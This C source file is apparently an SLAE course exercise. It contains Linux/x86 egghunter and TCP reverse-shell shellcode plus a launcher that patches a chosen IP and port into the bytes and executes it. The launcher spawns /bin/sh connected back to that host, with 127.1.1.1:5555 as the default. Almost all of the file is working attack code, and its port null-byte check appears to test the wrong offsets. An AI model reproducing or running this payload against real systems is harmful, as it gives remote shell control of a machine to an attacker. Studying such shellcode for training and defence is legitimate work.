// Linux/x86 TCP reverse shell shellcode with egghunter
// Author SLAE - 926 for SecurityTube Linux Assembly Expert course

#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include <stdlib.h>
#include <ctype.h>

#define EGG "\x90\x50\x90\x50"

unsigned char egghunter[] =\
"\xfc\x31\xc9\xf7\xe1\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8"
EGG // egg mark
"\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";

unsigned char shellcode[] = \
EGG
EGG
"\x68"
"\x7f\x01\x01\x01" // <- IP 127.1.1.1 (4 bytes)
"\x5f\x66\x68"
"\x15\xb3" // <- Port number 5555 (2 bytes) 
"\x5d\x31\xc0\x50\x40\x50\x5b\x50\x6a\x02\xb0\x66\x89\xe1\xcd\x80\x96\x5b\x57\x66\x55\x66\x53\x43\x89\xe1\x6a\x10\x51\x56\xb0\x66\x89\xe1\xcd\x80\x87\xcb\x87\xde\x49\xb0\x3f\xcd\x80\x75\xf9\x50\x50\x59\x5a\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x87\xe3\xcd\x80";



static bool zeroes(void) {
	 for(int i = 0; i < sizeof(shellcode)-1; i++) {
                if (shellcode[i] == '\x00')
                        return true;
                }
        return false;
}

int main (int argc, char *argv[]){

	if (argc > 3) {
		printf("Too many arguments\n");
		return 1;
		}
	
	else if (argc == 3 ) { 
		int port = strtol(argv[2], NULL, 10);

		if (port<1024 || port>65535){
			printf("Invalid port, port must be between 1024 and 65535\n");
			return 1;
			}
		*(short *)(shellcode+16) = port; // convert to hex
		char tmp = shellcode[16];
		shellcode[16] = shellcode[17];
		shellcode[17] = tmp;

		if (shellcode[8] == '\x00' || shellcode[9] == '\x00') {
			printf("Invalid port when converted to hex\n");
			return 1;
		}
		
		unsigned char arr[4]= {0};
		unsigned int i=0;
		while(*argv[1]){
			if (isdigit((unsigned char)*argv[1])) {
				arr[i] *= 10;
				arr[i] += *argv[1] - '0';
			}
			else {
				i++;
			}
			argv[1]++;
		}
		
		for(i = 0; i < 4; i++) {
			*(char *)(shellcode+9+i) = arr[i];
			if (shellcode[9+i] == '\x00') {
				printf("Invalid IP when converted to hex\n");
				return 1;
			}
		}
		
		if (zeroes()){
			printf("shellcode contains zeroes\n");
			return 1;
		} 
		printf("Sending reverse shell\n");
		goto SHELLCALL;
	}
	else {
		printf("Usage: ./reverse <ip> <port>\n");
		printf("No valid ip or port provided, sending reverse shell to localhost port 5555\n");
		SHELLCALL:
		__asm__ (
		"xorl %eax, %eax\n\t"
		"xorl %ebx, %ebx\n\t"
		"xorl %ecx, %ecx\n\t"
		"xorl %edx, %edx\n\t"
		"xorl %edi, %edi\n\t"
		"xorl %esi, %esi\n\t"
		"xorl %ebp, %ebp\n\t"
		
		"jmp egghunter");
	}
	
}
